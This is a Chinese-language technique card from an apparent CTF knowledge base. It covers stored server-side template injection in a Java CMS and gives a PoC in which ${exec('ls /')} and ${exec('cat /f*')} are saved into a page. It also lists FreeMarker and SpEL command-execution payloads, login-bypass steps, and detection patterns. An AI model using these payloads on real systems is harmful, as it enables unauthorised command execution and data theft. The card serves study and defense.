---
id: web-generic-ssti-java-cms-markdown-page-exec
title: Java CMS 页面 Markdown 内容二次渲染 SSTI：${exec('ls /')} 保存后直接执行命令
type: scenario
domain: web
path: web/generic/ssti
technique: java-cms-markdown-page-exec-ssti
aliases:
- PolarCMS SSTI
- Markdown 页面模板注入
- ${exec()} 命令执行
- Java CMS 页面内容 SSTI
- 存储型模板注入
tags:
- ssti
- java
- cms
- markdown
- template-injection
- stored
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V213
  verified_at: '2026-11-07T04:19:48+08:00'
  notes: 已对照原文与 img/03、04、07 核对：新建页面 exec 表达式回显根目录、cat /f* 取 flag 截图一致；引擎名未标注，卡已标 confidence=medium，保留。
---

## 一句话结论

后台“新建页面”允许用户提交 Markdown/HTML 内容，而服务端在展示页面时把这段内容当作 Java 模板/表达式源码二次渲染；在内容中写入 `${exec('ls /')}`，保存后访问页面即调用模板上下文暴露的 `exec` 函数执行系统命令并回显目录，换成 `${exec('cat /f*')}` 即可读 flag。

## 原理

- 很多 Java CMS 用模板引擎（FreeMarker、Velocity、Thymeleaf、Spring EL 或自研表达式）渲染页面；如果页面内容被作为**模板源**传入，而不是作为已转义的数据变量，`${...}` 会在服务端被求值。
- 该 CMS 的模板上下文暴露了一个 `exec` 函数（可能是自定义 helper、TemplateModel 或工具类方法）；`${exec('ls /')}` 会把字符串作为系统命令执行，并把 stdout 写回页面。原文在“新建页面”的 Markdown 内容中提交该 payload，保存后页面输出根目录列表（`app bin boot dev etc flag home ...`），证明命令执行。
- 这是存储型/二阶 SSTI：payload 先落在页面内容里，触发点在“查看/预览页面”时的服务端渲染，而不是提交请求本身；因此即使提交接口有过滤，渲染时仍可能执行。
- 如果上下文没有现成的 `exec`，同一 SSTI 还可以走引擎内置能力：FreeMarker 的 `?new`/`Execute`、SpEL 的 `T(java.lang.Runtime).getRuntime().exec(...)`、Thymeleaf 的 `T(...)` 反射等；具体取决于引擎与版本。
- 原文只说明“主页说这是用纯 java 搭建的”，没有给出引擎名；因此本卡按“页面内容被模板引擎求值 + 上下文有 exec”这一可观察事实记录，confidence=medium。

## 触发条件

- 攻击者能登录后台并创建/编辑页面（原文通过弱口令或 `<` 闭合绕过登录；密码正确时用户名任意）。
- 页面内容（Markdown/HTML）在服务端被模板/表达式引擎渲染，且用户内容作为模板源而非纯数据。
- 模板上下文暴露 `exec` 或可反射调用 `Runtime`/`ProcessBuilder` 的对象；没有沙箱/黑名单。
- 保存后能访问/预览该页面触发渲染。

## 利用步骤

1. 登录后台（弱口令、SQL/逻辑绕过或默认凭据），进入“新建页面”。
2. 在页面内容中提交 `${exec('ls /')}`，保存并访问该页面；若页面显示根目录列表，确认 RCE。
3. 读取 flag：`${exec('cat /f*')}`、`${exec('cat /flag')}` 或 `ls -la /` 后按实际路径读取。
4. 若 `exec` 被过滤，尝试引擎特定 payload：FreeMarker `${"freemarker.template.utility.Execute"?new()("id")}`、SpEL `${T(java.lang.Runtime).getRuntime().exec("id")}`、Thymeleaf `${T(java.lang.Runtime)...}` 等。
5. 若页面内容被 Markdown 转义，尝试预览接口、原始 HTML 模式、代码块/内联代码外的位置，或把 payload 放在页面标题/摘要等同样被渲染的字段。
6. 成功后可在页面中执行反弹 shell/写文件/读取配置，进一步横向。

## PoC

```text
页面名称：a
页面内容（Markdown）：
${exec('ls /')}
```

```text
保存后访问页面，响应中出现：
app bin boot dev etc flag home lib64 media mnt opt proc root run sbin srv sys tmp usr var
```

```text
读取 flag：
${exec('cat /f*')}
```

说明：PoC 与原文截图一致，未在原文目标上复跑；不同模板引擎的语法/可用函数不同，需按实际引擎调整。

## 变体与关联

- **FreeMarker 模板编辑/页面注入**：后台模板编辑中的 `?new Execute` 直接命令执行；见 [[web-generic-ssti-fastcms-template-edit-freemarker-rce]]。
- **SpEL/Thymeleaf 反射**：禁用 `T()` 时用 `getClass().forName` 反射读文件/执行；见 [[web-java-expression-spel-thymeleaf-strings-reflection-file-read]]、[[web-generic-ssti-thymeleaf-reflection-files-read-waf-bypass]]。
- **FreeMarker SAFER_RESOLVER 绕过**：第三方 TemplateModel/静态块/`?api` 等；见 [[web-generic-ssti-freemarker-safer-resolver-bypass]]。
- **存储型 vs 反射型**：本卡是保存页面后的二阶触发；若内容在提交时立即预览渲染，则是反射型。
- **边界**：页面内容被当作纯文本/Markdown 转义、模板上下文没有 exec/Runtime、引擎沙箱限制、或后台无法登录时，本链不成立。

## 检测与防御

- 防御：Markdown 渲染只输出 HTML 并做 sanitize，绝不把用户内容当模板源码求值；页面内容作为模板数据变量传入，而不是拼接进模板字符串。
- 加固：模板上下文移除 `exec`、`Runtime`、`ProcessBuilder` 等危险对象；启用引擎沙箱/SAFER_RESOLVER；后台强制强口令与 MFA，修复登录逻辑绕过。
- 检测：页面内容中出现 `${...}`、`#{...}`、`<#...>`、`T(`、`?new`、`Runtime`、`exec(` 等模板/命令特征；保存后出现异常子进程、出网或目录列表回显。
- 响应：删除恶意页面内容、排查同账号创建的其他页面/模板、轮换后台凭据、检查是否已写入 WebShell。
